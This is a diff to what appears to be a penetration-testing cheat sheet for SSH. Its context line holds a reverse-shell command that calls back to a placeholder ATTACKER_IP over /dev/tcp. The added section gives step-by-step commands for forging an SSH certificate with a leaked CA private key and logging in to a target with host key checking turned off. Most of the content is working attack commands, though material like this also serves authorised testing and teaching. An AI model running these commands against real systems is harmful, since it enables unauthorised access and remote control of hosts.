@@ -60,3 +60,25 @@ Default credentials
 
     ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USER@IP -t 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
 
+## SSH Private CA Key Compromise
+
+### 1) Locate the leaked CA key
+
+This scenario depends on use case, there is no fixed way. Example could be a public GitHub repo or an insecure directory indexing on a web application.
+
+### 2) Generate an attacker keypair
+
+    ssh-keygen -t ed25519 -f attacker_key -N ""
+
+### 3) Sign a forged certificate
+
+    ssh-keygen -s <ca-key> -I <identity> -n <principal> -V <validity> <user-public-key>
+
+### 4) Confirm what you signed
+
+    ssh-keygen -L -f attacker_key-cert.pub
+
+### 5) Connect with the forged certificate
+
+    ssh -o StrictHostKeyChecking=no -i attacker_key -o CertificateFile=attacker_key-cert.pub PRINCIPAL@TARGET_HOST
+
